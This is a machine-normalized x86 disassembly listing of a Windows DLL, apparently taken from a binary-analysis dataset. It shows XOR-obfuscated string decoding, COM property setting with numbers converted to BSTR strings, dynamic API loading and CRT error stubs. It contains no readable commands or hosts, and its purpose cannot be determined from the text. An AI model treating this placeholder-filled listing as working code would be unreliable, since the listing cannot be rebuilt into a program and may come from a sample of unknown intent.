test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_10042493
push [ ebp + 0x8 ]
call sub_10005051
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_10042493
lea eax [ ebp - 0x20 ]
push eax
call sub_1002503f
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_10005051
pop ecx
sub_1000a880
push ebp
mov ebp esp
sub esp 0x1f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx 0x3
mov [ ebp - 0x1f8 ] eax
xor eax eax
mov ebx edx
mov [ ebp - 0x1c ] cx
mov ecx [ r--data ]
mov [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1d0 ] ebx
mov [ ebp - 0x1e8 ] eax
mov [ ebp - 0x1f4 ] eax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfffa
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0x1e8 ]
push edx
mov edx [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0x28 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0x1e8 ]
jns r-xdata
lea edx [ ebp - 0x1c4 ]
mov [ ebp - 0x1c4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x5a
call sub_1000a6f0
mov esi [ ebx ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0x12e
jmp r-xdata
lea edx [ ebp - 0x1c0 ]
mov eax 0xe7
call sub_1000a6f0
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx + 0x4 ]
lea eax [ ebp - 0x1f0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1f0 ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x1ac ]
mov eax 0xc3
call sub_1000a6f0
mov esi [ ebp - 0x1f0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x5
jmp r-xdata
call sub_1000a6f0
mov edx [ ebp - 0x1f0 ]
push edx
call [ SysFreeString@IAT ]
mov ecx [ ebx + 0x20 ]
lea eax [ ebp - 0x1ec ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1ec ] 0x0
call [ VarBstrFromUI4@IAT ]
lea edx [ ebp - 0x120 ]
mov eax 0x14
call sub_1000a6f0
mov esi [ ebp - 0x1ec ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
mov ecx [ ebp - 0x1f0 ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1e8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1c4 ] 0x0
mov edx [ ebp - 0x1ec ]
push edx
call [ SysFreeString@IAT ]
lea edx [ ebp - 0xd0 ]
mov eax 0x8a
call sub_1000a6f0
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10038260
test eax eax
je r-xdata
mov ecx [ ebp - 0x1ec ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x72
call sub_1000a6f0
mov esi [ ebx + 0xc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x42
jmp r-xdata
mov ebx [ ebx + 0x10 ]
mov ecx ebx
mov [ ebp - 0x1cc ] ebx
call sub_10004e40
mov ebx eax
lea ecx [ ebx + ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x1cc ]
mov esi eax
mov edi esi
call sub_100611b0
lea edx [ ebp - 0xbc ]
mov eax 0x13
call sub_1000a6f0
mov edi [ ebp - 0x1c8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xb0
call sub_1000a6f0
test esi esi
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xf
call sub_1000a6f0
lea edx [ ebp - 0xe4 ]
mov eax 0x71
call sub_1000a6f0
mov ebx [ ebp - 0x1d0 ]
mov esi [ ebx + 0x14 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push edi
call sub_10038260
test eax eax
je r-xdata
push esi
call [ LocalFree@IAT ]
lea edx [ ebp - 0x90 ]
mov eax 0xcc
call sub_1000a6f0
mov esi [ ebx + 0x18 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0xb1
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x25
call sub_1000a6f0
mov esi [ ebx + 0x1c ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push edi
call sub_10038260
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x40
call sub_1000a6f0
mov edx [ ebx + 0x2c ]
lea ecx [ ebp - 0x1d4 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0x1d4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1d4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x101
jmp r-xdata
lea edx [ ebp - 0x15c ]
mov eax 0x8b
call sub_1000a6f0
mov esi [ ebp - 0x1d4 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d4 ] eax
mov edx [ ebp - 0x1d4 ]
mov edi [ SysFreeString@IAT ]
push edx
call edi
mov ecx [ ebx + 0x28 ]
lea eax [ ebp - 0x1dc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1dc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1dc ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x1b
call sub_1000a6f0
lea edx [ ebp - 0x148 ]
mov eax 0x109
call sub_1000a6f0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038260
mov edx [ ebp - 0x1dc ]
push edx
call edi
mov ecx [ ebx + 0x24 ]
lea eax [ ebp - 0x1d8 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d8 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1dc ] eax
lea edx [ ebp - 0x18c ]
mov eax 0x85
call sub_1000a6f0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d8 ] eax
mov edx [ ebp - 0x1d8 ]
push edx
call edi
cmp [ ebx + 0x38 ] 0x1
jne r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x11a
call sub_1000a6f0
mov edx [ ebp - 0x1e8 ]
mov ecx [ ebp - 0x1c8 ]
call sub_100656e0
test eax eax
je r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
push 0x0
push 0x80000000
push 0x1
mov [ ebp - 0x1e4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1e4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x1f4 ]
push edx
mov edx [ ebp - 0x1e8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x1f4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xb4
call sub_1000a6f0
lea edx [ ebp - 0xf8 ]
mov eax 0xfc
call sub_1000a6f0
mov eax [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push eax
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e4 ] eax
lea edx [ ebp - 0x74 ]
mov eax 0x8c
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1f4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1e4 ]
push ecx
call edi
mov eax [ ebx + 0x44 ]
mov ecx [ ebx + 0x40 ]
lea edx [ ebp - 0x1e0 ]
push edx
push 0x0
push 0x80000000
push eax
push ecx
mov [ ebp - 0x1e0 ] 0x0
call [ VarBstrFromUI8@IAT ]
cmp [ ebp - 0x1e0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x29
call sub_1000a6f0
lea edx [ ebp - 0x10c ]
mov eax 0x1e
call sub_1000a6f0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e0 ] eax
mov edx [ ebp - 0x1e0 ]
push edx
call edi
mov ecx [ ebx + 0x48 ]
lea eax [ ebp - 0x1d0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d0 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x53
call sub_1000a6f0
lea edx [ ebp - 0x9c ]
mov eax 0xaa
call sub_1000a6f0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d0 ] eax
mov edx [ ebp - 0x1d0 ]
push edx
call edi
mov ecx [ ebx + 0x4c ]
lea eax [ ebp - 0x1cc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1cc ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1cc ] 0x0
jne r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x4c
call sub_1000a6f0
lea edx [ ebp - 0x174 ]
mov eax 0x3
call sub_1000a6f0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1cc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10038260
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1cc ] eax
mov edx [ ebp - 0x1cc ]
push edx
call edi
lea edx [ ebp - 0x74 ]
mov eax 0x66
call sub_1000a6f0
sub_1000b040
push ebp
mov ebp esp
sub esp 0xf8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc0 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0xbc ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0xf8 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc8 ] ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0xb4 ] edx
mov edx [ ebp + 0x24 ]
mov [ ebp - 0xc4 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0xcc ] ecx
mov ecx [ ebp + 0x2c ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xf4 ] edx
mov edx [ ebp + 0x30 ]
mov [ ebp - 0xdc ] eax
mov eax [ ebp + 0x34 ]
mov [ ebp - 0xb8 ] ecx
mov ecx [ ebp + 0x38 ]
xor edi edi
mov [ ebp - 0xec ] edx
mov edx [ ebp + 0x3c ]
mov [ ebp - 0xe4 ] eax
mov eax [ ebp + 0x40 ]
mov [ ebp - 0xd0 ] ecx
mov ecx [ ebp + 0x44 ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ ebp - 0xd8 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0xe8 ] ecx
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x10a
call sub_1000a6f0
mov eax [ esi ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xa
call sub_1000a6f0
mov [ esi + 0x4 ] edi
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x4 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0xd4 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xd4 ]
push edx
push ebx
push eax
mov [ esi ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi ] edi
lea edx [ ebp - 0xa8 ]
mov eax 0xb7
call sub_1000a6f0
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc0 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax edi
je r-xdata
push r--data
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push r--data
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc0 ]
push ebx
push ecx
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
lea edx [ ebp - 0x2c ]
mov eax 0x126
call sub_1000a6f0
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
mov ebx [ ebp - 0xbc ]
add esp 0xc
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x121
call sub_1000a6f0
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xbc ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
lea edx [ ebp - 0x28 ]
xor eax eax
call sub_1000a6f0
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xc8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x105
call sub_1000a6f0
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc8 ]
push ebx
push ecx
push eax
mov [ esi + 0x14 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x9c
call sub_1000a6f0
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb4 ]
push ebx
push ecx
push eax
mov [ esi + 0x18 ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x18 ] edi
mov ebx [ ebp - 0xb4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x55
call sub_1000a6f0
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x20 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xc4 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_10078600
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0xc4 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x9f
call sub_1000a6f0
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x2c ] eax
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xcc ]
cmp eax edi
je r-xdata
mov [ esi + 0x28 ] edi
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0xdc ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0xec ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax edi
je r-xdata
mov ebx [ ebp - 0xb8 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xe4 ]
cmp eax edi
je r-xdata
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x34 ] eax
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xb8 ]
push ebx
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x30 ] edi
lea edx [ ebp - 0x34 ]
mov eax 0x107
call sub_1000a6f0
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0xd8 ]
cmp eax edi
je r-xdata
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0xd0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x48
call sub_1000a6f0
push eax
call sub_1000eb90
cdq
add esp 0x4
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] edx
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x82
call sub_1000a6f0
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0xe0 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x5b
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov [ esi + 0x48 ] 0x989680
mov eax esi
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x40
push eax
call sub_1000eb90
mov [ esi + 0x48 ] eax
add esp 0x4
mov eax esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x40
mov eax [ ebp - 0xe8 ]
cmp eax edi
je r-xdata
sub_1000b535
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
sar eax 0x1
sar esi 0x1
cmp esi eax
ja r-xdata
mov eax esi
pop esi
pop ebp
retn
lea ecx [ esi + esi ]
push ecx
push [ ebp + 0x10 ]
add eax eax
push eax
push [ ebp + 0x8 ]
call sub_100591ce
add esp 0x10
sub_1000b569
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_10012991
mov [ eax ] 0xc
call sub_10012991
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_10042f06
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_10012991
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_100112ab
pop ecx
mov [ edi ] eax
call sub_1002788e
call esi
push eax
call sub_100112ab
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_1000b659
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1000defd
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1000b6d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10081d4b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi edx
cmp [ edi + 0x14 ] 0x8
mov esi ecx
mov [ esp + 0xc ] 0x0
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov ecx r--data
mov eax [ esi + 0x39c ]
mov [ esp + 0xc ] eax
inc eax
push 0xd0
mov [ esi + 0x39c ] eax
call sub_1005ac7e
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x48 ] 0x0
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_1000b569
add esp 0x4
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
xor edi edi
mov edx [ esp + 0xc ]
push edi
push edx
push eax
call sub_10044720
mov edi eax
jmp r-xdata
mov ecx [ esp + 0xc ]
lea edi [ esi + 0x3c0 ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] 0x0
call sub_100608e0
inc [ esi + 0x3d0 ]
jmp r-xdata
lea edx [ esp + 0x18 ]
mov eax 0x55
call sub_1001bb80
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
cmp eax [ esi + 0x3a8 ]
jne r-xdata
mov ecx [ esi + 0x3a0 ]
lea edx [ esp + 0x10 ]
cmp ecx edx
ja r-xdata
mov [ esp + 0x48 ] 0xffffffff
mov eax [ esi + 0x3a4 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] edi
cmp ecx eax
jae r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov eax [ esi + 0x3a4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_10019240
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x3a8 ]
jne r-xdata
add [ esi + 0x3a4 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x3a4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_10019240
mov ecx [ esi + 0x3a0 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_1000b880
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0xc ] eax
call sub_10078600
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0xc ] 0x0
sub_1000b8bc
push 0x14
push r--data
call sub_10078b50
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10078b95
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10038317
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005905c
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b99c
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1000b9b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100818f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x78 ] eax
mov eax [ rw-data ]
mov edi [ eax + 0x4 ]
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x70 ] eax
cmp edi [ eax + 0x8 ]
je r-xdata
xor eax eax
lea ecx [ ecx ]
push esi
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
